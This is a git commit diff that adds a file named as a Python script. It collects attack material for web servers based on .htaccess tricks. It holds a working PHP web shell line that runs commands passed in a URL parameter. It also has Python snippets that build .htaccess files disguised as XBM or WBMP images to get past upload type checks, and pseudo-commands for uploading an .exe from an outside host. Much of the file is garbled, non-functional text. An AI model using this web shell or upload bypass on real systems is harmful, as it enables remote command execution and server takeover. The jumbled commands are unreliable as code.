45ef2cd7dd336235a2877b6bac17481491d32140
Z4 <30985576+TheProdigyLeague@users.noreply.github.com>
2023-04-04 16:38:42 -0500

    upd -re --mod

---
+++ ABUSE_CLI/SERVER-SIDE_app_cache/0verride.py
@@ -0,0 +1,46 @@
+>>>import metasploit
+>>>--xploit .htaccess --upl <?php>
+>>>".htaccess/file" --upl xxx.com/ext/code.exe
+>>> --upl --vuln localHOST:8080[+]type.js web.app/x-httpd-php.htaccess.mis.config<?php$.sh>
+>>>loaclHOST:8080 .htaccess.exe<?php>/code.exe for ===dir/sub is upl
+>>>import docker
+$--docker Self-htaccess.web.sh
+(c)By Wireghoul
+$ http://www.justanotherhacker.com/htshell/webShell/projects/.htaccess --override Default ["DENY"] --rule &&%web||<Files ~ "^\.ht">$Order allow,denyAllow from all</Files>
+$ .htaccess .php/this "apache" --dir from .htaccess \[+]type.js app/x-httpd-php .htaccess
+##### S  H  E  L  L ######
+<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
+# .htaccess upload as image
+>>>If `exif_imagetype` 
+    function 
+        is server-side*determine.img//type.js 
+            &&create`.htaccess/image`polyglot 
+                [Supported image types]::(http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap)  
+                [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format) in `.htaccess` --ignore "line" "start" * `\x00` * `#`
+                    this script.js for --gen valid `.htaccess/img`polyglot
+~
+>>> create valid .htaccess/xbm.img
+    width = 50
+    height = 50
+    payload = '# .htaccess file'
+        with open('.htaccess', 'w') as htaccess:
+    htaccess.write('#define test_width %d\n' % (width, ))
+    htaccess.write('#define test_height %d\n' % (height, ))
+    htaccess.write(payload)
+or
+>>> create valid .htaccess/wbmp.img
+    type_header = b'\x00'
+    fixed_header = b'\x00'
+    width = b'50'
+    height = b'50'
+    payload = b'# .htaccess file'
+<>
+with open('.htaccess', 'wb') as htaccess:
+    htaccess.write(type_header + fixed_header + width + height)
+    htaccess.write(b'\n')
+    htaccess.write(payload)
+<>
+# Thanks
+* [ATTACKING WEBSERVERS VIA .HTACCESS - By Eldar Marcussen](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
+* [Protection from Unrestricted File Upload Vulnerability](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
+* [Writeup to l33t-hoster task, Insomnihack Teaser 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
